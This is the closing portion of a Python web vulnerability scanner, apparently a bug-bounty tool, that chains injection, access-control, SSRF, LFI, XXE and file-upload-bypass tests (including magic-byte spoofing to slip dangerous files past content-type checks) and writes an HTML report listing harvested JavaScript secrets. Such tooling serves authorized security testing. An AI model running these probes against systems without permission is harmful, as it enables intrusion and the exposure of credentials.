                # Add magic bytes prefix for JPEG to bypass content-type checks
                if ctype == "image/jpeg" and not content.startswith(b"\xff\xd8"):
                    files = {"file": (filename, b"\xff\xd8\xff\xe0" + content, ctype)}

                resp = requests.post(
                    url, files=files, headers=headers,
                    timeout=timeout, verify=False, allow_redirects=True,
                    proxies=proxies,
                )
                if resp.status_code in (200, 201, 202):
                    # Check if file path/URL is in response
                    upload_success = re.search(
                        r'"url"|"path"|"filename"|"file_url"|"location"|uploaded|success',
                        resp.text, re.I
                    )
                    dangerous_exec = re.search(sig_re, resp.text, re.I) if sig_re else False

                    if upload_success or dangerous_exec:
                        severity = "critical" if dangerous_exec else "high"
                        results.append({
                            "type":        "file-upload-bypass",
                            "severity":    severity,
                            "url":         url,
                            "filename":    filename,
                            "content_type": ctype,
                            "description": (
                                f"File upload accepted dangerous file '{filename}' "
                                f"(MIME: {ctype}) — potential remote code execution"
                                if dangerous_exec else
                                f"File upload endpoint accepts '{filename}' without proper validation"
                            ),
                        })
                        break
            except Exception:
                pass
        return results

    tasks = [(h, p) for h in alive_hosts[:20] for p in _UPLOAD_PATHS]
    with _cf.ThreadPoolExecutor(max_workers=15) as exe:
        for fut in _cf.as_completed([exe.submit(_test_upload, h, p) for h, p in tasks]):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    upload_json = os.path.join(out_dir, "upload_findings.json")
    with open(upload_json, "w") as f:
        json.dump(findings, f, indent=2)
    logger.info(f"  File upload findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  CONSOLIDATED VULN SCAN RUNNER
# ═══════════════════════════════════════════════════════════════════════════

def run_full_vuln_scan(
    out_dir: str,
    config: dict,
    logger: logging.Logger,
    gf_results: dict,
    alive_params_file: str,
    alive_file: str = "",
    subdomains_file: str = "",
) -> dict:
    """
    Full vulnerability scanning pipeline (all modules):
    Phase A — Injection: Nuclei + dalfox XSS + sqlmap SQLi + SSTI + Open Redirect
    Phase B — Access/Config: CORS + 403 Bypass + SSRF + Host Header + JWT
    Phase C — Infrastructure: Subdomain Takeover + GraphQL
    Phase D — Logic: IDOR
    """
    all_findings: List[dict] = []
    summary: dict = {}

    def _add(findings: List[dict], sev_key: str):
        all_findings.extend(findings)
        if findings:
            summary[sev_key] = summary.get(sev_key, 0) + len(findings)

    # ── Phase A: Injection & Execution ─────────────────────────────────────
    logger.info(colorize("  [A] Injection & Execution tests", Colors.YELLOW))

    # A1. Nuclei — broad templates
    nuclei_summary = run_nuclei_scan(alive_params_file, out_dir, config, logger)
    for sev, cnt in nuclei_summary.items():
        summary[sev] = summary.get(sev, 0) + cnt

    # A2. XSS (dalfox)
    if not config.get("no_xss"):
        xss_file = gf_results.get("xss", "")
        if xss_file and os.path.exists(xss_file):
            _add(run_dalfox(xss_file, out_dir, config, logger), "high")

    # A3. SQLi (sqlmap)
    if not config.get("no_sqli"):
        sqli_file = gf_results.get("sqli", "")
        if sqli_file and os.path.exists(sqli_file):
            _add(run_sqlmap(sqli_file, out_dir, config, logger), "critical")

    # A4. SSTI
    ssti_findings = run_ssti_detection(alive_params_file, out_dir, config, logger)
    _add(ssti_findings, "critical")

    # A5. Open Redirect
    redir_file = gf_results.get("redirect", "")
    if redir_file and os.path.exists(redir_file):
        _add(run_open_redirect(redir_file, out_dir, config, logger), "medium")

    # ── Phase B: Access Control & Configuration ─────────────────────────────
    logger.info(colorize("  [B] Access control & configuration checks", Colors.YELLOW))

    if alive_file and os.path.exists(alive_file):
        # B1. CORS
        _add(run_cors_check(alive_file, out_dir, config, logger), "high")

        # B2. 403 Bypass
        _add(run_403_bypass(alive_file, out_dir, config, logger), "high")

        # B3. Host Header Injection
        _add(run_host_header_injection(alive_file, out_dir, config, logger), "high")

    # B4. SSRF
    ssrf_file = gf_results.get("ssrf", "")
    _add(
        run_ssrf_detection(ssrf_file or "", alive_params_file, out_dir, config, logger),
        "critical",
    )

    # B5. JWT
    _add(run_jwt_analysis(alive_params_file, alive_file or "", out_dir, config, logger), "critical")

    # ── Phase C: Infrastructure ─────────────────────────────────────────────
    logger.info(colorize("  [C] Infrastructure & technology checks", Colors.YELLOW))

    if alive_file and os.path.exists(alive_file):
        # C1. GraphQL Discovery
        _add(run_graphql_discovery(alive_file, out_dir, config, logger), "medium")

    # C2. Subdomain Takeover
    if subdomains_file and os.path.exists(subdomains_file):
        _add(
            run_takeover_check(subdomains_file, alive_file or "", out_dir, config, logger),
            "high",
        )

    # ── Phase D: Logic / IDOR / Race Condition ────────────────────────────
    logger.info(colorize("  [D] Logic & access control tests", Colors.YELLOW))

    idor_file = gf_results.get("idor", "")
    if idor_file and os.path.exists(idor_file):
        _add(run_idor_detection(idor_file, out_dir, config, logger), "high")

    # D2. Race Condition
    if os.path.exists(alive_params_file):
        _add(run_race_condition(alive_params_file, out_dir, config, logger), "high")

    # ── Phase E: File-based Attacks ────────────────────────────────────────
    logger.info(colorize("  [E] File-based attack surface", Colors.YELLOW))

    # E1. LFI / Path Traversal
    if os.path.exists(alive_params_file):
        _add(run_lfi_detection(alive_params_file, out_dir, config, logger), "critical")

    # E2. XXE
    if alive_file and os.path.exists(alive_file):
        _add(run_xxe_detection(alive_file, out_dir, config, logger), "critical")

    # E3. File Upload Bypass
    if alive_file and os.path.exists(alive_file):
        _add(run_file_upload_bypass(alive_file, out_dir, config, logger), "critical")

    # ── Append all extra findings to findings.json ─────────────────────────
    if all_findings:
        with open(os.path.join(out_dir, "findings.json"), "a") as f:
            for finding in all_findings:
                f.write(json.dumps(finding) + "\n")

    # ── Collect JS secrets count ───────────────────────────────────────────
    secrets_file = os.path.join(out_dir, "js_secrets.json")
    if os.path.exists(secrets_file):
        try:
            with open(secrets_file) as f:
                secrets = json.load(f)
            if secrets:
                summary["info_secrets"] = len(secrets)
        except Exception:
            pass

    # ── Print summary ──────────────────────────────────────────────────────
    crit = summary.get("critical", 0)
    high = summary.get("high", 0)
    med  = summary.get("medium", 0)
    logger.info(
        colorize(
            f"  Scan complete — Critical:{crit} High:{high} Medium:{med} "
            f"Secrets:{summary.get('info_secrets',0)}",
            Colors.RED if (crit or high) else Colors.GREEN,
        )
    )
    return summary


# ═══════════════════════════════════════════════════════════════════════════
#  ENHANCED REPORT
# ═══════════════════════════════════════════════════════════════════════════

def save_html_report(
    domain: str,
    out_dir: str,
    summary: dict,
    gf_results: dict,
    logger: logging.Logger,
) -> str:
    """Generate a standalone HTML report for sharing."""
    nuclei_findings = parse_nuclei_json(os.path.join(out_dir, "findings.json"))

    extra_finding_files = [
        "xss_findings.json", "sqli_findings.json", "idor_findings.json",
        "cors_findings.json", "bypass_findings.json", "ssti_findings.json",
        "hostheader_findings.json", "ssrf_findings.json", "redirect_findings.json",
        "takeover_findings.json", "graphql_findings.json", "jwt_findings.json",
    ]
    extra_findings: List[dict] = []
    for fname in extra_finding_files:
        fpath = os.path.join(out_dir, fname)
        if os.path.exists(fpath):
            try:
                with open(fpath) as f:
                    extra_findings.extend(json.load(f))
            except Exception:
                pass

    xss_findings  = [f for f in extra_findings if f.get("type") == "xss"]
    sqli_findings = [f for f in extra_findings if f.get("type") == "sqli"]
    idor_findings = [f for f in extra_findings if f.get("type") == "idor"]
    secrets: List[dict] = []

    if os.path.exists(os.path.join(out_dir, "js_secrets.json")):
        try:
            with open(os.path.join(out_dir, "js_secrets.json")) as f:
                secrets = json.load(f)
        except Exception:
            pass

    counts = {
        "subdomains":  count_lines(os.path.join(out_dir, "subdomains.txt")),
        "alive_hosts": count_lines(os.path.join(out_dir, "alive_subdomains.txt")),
        "all_urls":    count_lines(os.path.join(out_dir, "all_urls.txt")),
        "params":      count_lines(os.path.join(out_dir, "params.txt")),
        "js_files":    count_lines(os.path.join(out_dir, "js_files.txt")),
    }

    sev_colors = {
        "critical": "#ff2222", "high": "#f87171",
        "medium": "#fbbf24",   "low": "#60a5fa", "info": "#94a3b8",
    }

    def findings_rows(findings_list: List[dict]) -> str:
        rows = []
        for f in findings_list[:200]:
            sev  = (f.get("info", {}).get("severity") or f.get("severity") or "info").lower()
            name = f.get("info", {}).get("name") or f.get("description") or f.get("template-id") or "Unknown"
            url  = f.get("matched-at") or f.get("url") or "—"
            ftype = f.get("type") or f.get("info", {}).get("tags", [""])[0] if f.get("info") else f.get("type", "—")
            col  = sev_colors.get(sev, "#94a3b8")
            rows.append(
                f'<tr><td><span style="color:{col};font-weight:bold">{sev.upper()}</span></td>'
                f'<td style="color:#64748b;font-size:11px">{ftype}</td>'
                f'<td>{name}</td><td style="word-break:break-all;font-size:11px">{url}</td></tr>'
            )
        return "".join(rows) or "<tr><td colspan=4 style='color:#64748b'>No findings</td></tr>"

    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Security Report — {domain}</title>
<style>
body{{font-family:'Segoe UI',sans-serif;background:#080b12;color:#e2e8f0;margin:0;padding:24px}}
h1{{color:#00ff88;font-size:22px;margin-bottom:4px}}
h2{{color:#00d4ff;font-size:15px;margin:20px 0 10px;border-bottom:1px solid #1e2a3a;padding-bottom:6px}}
.meta{{color:#64748b;font-size:12px;margin-bottom:24px}}
.stats{{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin:16px 0}}
.stat{{background:#0d1117;border:1px solid #1e2a3a;border-radius:8px;padding:14px;text-align:center}}
.stat-num{{font-size:28px;font-weight:700;color:#00d4ff;font-family:monospace}}
.stat-label{{font-size:11px;color:#64748b;margin-top:4px}}
.sev-grid{{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin:12px 0}}
.sev-box{{background:#0d1117;border-radius:8px;padding:12px;text-align:center;border:1px solid #1e2a3a}}
table{{width:100%;border-collapse:collapse;font-size:13px;margin-top:8px}}
th{{background:#111827;padding:10px 12px;text-align:left;color:#94a3b8;font-size:11px;text-transform:uppercase}}
td{{padding:9px 12px;border-bottom:1px solid #1e2a3a;color:#cbd5e1;vertical-align:top}}
tr:hover td{{background:#0d1117}}
.secret-item{{background:#0d1117;border:1px solid #1e2a3a;border-radius:6px;padding:10px;margin:6px 0;font-family:monospace;font-size:12px}}
.secret-type{{color:#fbbf24;font-weight:bold}}
.secret-val{{color:#ef4444;word-break:break-all}}
.badge{{display:inline-block;padding:2px 8px;border-radius:12px;font-size:10px;font-weight:600}}
</style></head><body>
<h1>🛡 Security Assessment Report</h1>
<div class="meta">Target: <b style="color:#fff">{domain}</b> &nbsp;|&nbsp; Generated: {datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</div>

<h2>📊 Scan Statistics</h2>
<div class="stats">
  <div class="stat"><div class="stat-num">{counts["subdomains"]}</div><div class="stat-label">Subdomains</div></div>
  <div class="stat"><div class="stat-num">{counts["alive_hosts"]}</div><div class="stat-label">Active Hosts</div></div>
  <div class="stat"><div class="stat-num">{counts["all_urls"]}</div><div class="stat-label">URLs Collected</div></div>
  <div class="stat"><div class="stat-num">{counts["params"]}</div><div class="stat-label">Parameters</div></div>
  <div class="stat"><div class="stat-num">{counts["js_files"]}</div><div class="stat-label">JS Files</div></div>
</div>

<h2>🔴 Vulnerability Summary</h2>
<div class="sev-grid">
  <div class="sev-box"><div style="font-size:24px;font-weight:700;color:#ff2222">{summary.get("critical",0)}</div><div style="font-size:11px;color:#64748b">Critical</div></div>
  <div class="sev-box"><div style="font-size:24px;font-weight:700;color:#f87171">{summary.get("high",0)+len(xss_findings)}</div><div style="font-size:11px;color:#64748b">High (+ XSS)</div></div>
  <div class="sev-box"><div style="font-size:24px;font-weight:700;color:#fbbf24">{summary.get("medium",0)}</div><div style="font-size:11px;color:#64748b">Medium</div></div>
  <div class="sev-box"><div style="font-size:24px;font-weight:700;color:#60a5fa">{summary.get("low",0)}</div><div style="font-size:11px;color:#64748b">Low</div></div>
  <div class="sev-box"><div style="font-size:24px;font-weight:700;color:#fbbf24">{len(secrets)}</div><div style="font-size:11px;color:#64748b">JS Secrets</div></div>
</div>

<h2>⚡ Vulnerability Findings</h2>
<table><thead><tr><th>Severity</th><th>Type</th><th>Finding</th><th>URL</th></tr></thead>
<tbody>{findings_rows(nuclei_findings + extra_findings)}</tbody></table>

<h2>🔑 JavaScript Secrets</h2>
{''.join(f'<div class="secret-item"><span class="secret-type">[{s["type"]}]</span> <span style="color:#94a3b8;font-size:11px">{s["url"]}</span><br><span class="secret-val">{s["value"]}</span></div>' for s in secrets[:30]) or '<p style="color:#64748b">No secrets found</p>'}

<h2>🎯 Attack Surface by Category</h2>
<table><thead><tr><th>Category</th><th>Count</th></tr></thead><tbody>
{''.join(f'<tr><td>{k.upper()}</td><td>{count_lines(v)}</td></tr>' for k,v in gf_results.items() if os.path.exists(v))}
</tbody></table>
</body></html>"""

    report_path = os.path.join(out_dir, "report.html")
    with open(report_path, "w") as f:
        f.write(html)
    logger.info(f"  HTML report: {colorize(report_path, Colors.CYAN)}")
    return report_path


if __name__ == "__main__":
    main()
